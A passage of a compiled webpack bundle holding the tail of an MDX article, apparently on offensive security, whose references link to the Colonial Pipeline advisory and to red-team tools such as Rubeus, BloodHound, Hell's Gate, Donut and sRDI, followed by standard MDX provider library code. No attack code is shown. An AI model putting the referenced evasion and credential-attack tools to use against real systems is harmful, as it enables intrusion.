          children: "https://www.cisa.gov/colonial-pipeline-attack"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Rubeus (GhostPack): ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/GhostPack/Rubeus",
          children: "https://github.com/GhostPack/Rubeus"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["BloodHound: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/BloodHoundAD/BloodHound",
          children: "https://github.com/BloodHoundAD/BloodHound"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Hell's Gate: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/am0nsec/HellsGate",
          children: "https://github.com/am0nsec/HellsGate"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Halo's Gate: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://blog.sektor7.net/halos-gate",
          children: "https://blog.sektor7.net/halos-gate"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Donut (shellcode generator): ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/TheWover/donut",
          children: "https://github.com/TheWover/donut"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["sRDI: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/monoxgas/sRDI",
          children: "https://github.com/monoxgas/sRDI"
        })]
      }), "\n"]
    })]
  });
}
function MDXContent(props = {}) {
  const {wrapper: MDXLayout} = {
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
    ...props,
    children: (0,jsx_runtime.jsx)(_createMdxContent, {
      ...props
    })
  }) : _createMdxContent(props);
}



/***/ },

/***/ 28453
(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   R: () => (/* binding */ useMDXComponents),
/* harmony export */   x: () => (/* binding */ MDXProvider)
/* harmony export */ });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
/**
 * @import {MDXComponents} from 'mdx/types.js'
 * @import {Component, ReactElement, ReactNode} from 'react'
 */

/**
 * @callback MergeComponents
 *   Custom merge function.
 * @param {Readonly<MDXComponents>} currentComponents
 *   Current components from the context.
 * @returns {MDXComponents}
 *   Additional components.
 *
 * @typedef Props
 *   Configuration for `MDXProvider`.
 * @property {ReactNode | null | undefined} [children]
 *   Children (optional).
 * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @property {boolean | null | undefined} [disableParentContext=false]
 *   Turn off outer component context (default: `false`).
 */



/** @type {Readonly<MDXComponents>} */
const emptyComponents = {}

const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)

/**
 * Get current components from the MDX Context.
 *
 * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @returns {MDXComponents}
 *   Current components.
 */
function useMDXComponents(components) {
  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)

  // Memoize to avoid unnecessary top-level context changes
  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
    function () {
      // Custom merge via a function prop
      if (typeof components === 'function') {
        return components(contextComponents)
      }

      return {...contextComponents, ...components}
    },
    [contextComponents, components]
  )
}

/**
 * Provider for MDX context.
 *
 * @param {Readonly<Props>} properties
 *   Properties.
 * @returns {ReactElement}
 *   Element.
 * @satisfies {Component}
 */
function MDXProvider(properties) {
  /** @type {Readonly<MDXComponents>} */
  let allComponents

  if (properties.disableParentContext) {
    allComponents =
      typeof properties.components === 'function'
        ? properties.components(emptyComponents)
        : properties.components || emptyComponents
  } else {
    allComponents = useMDXComponents(properties.components)
  }

  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
    MDXContext.Provider,
    {value: allComponents},
    properties.children
  )
}


/***/ }

}]);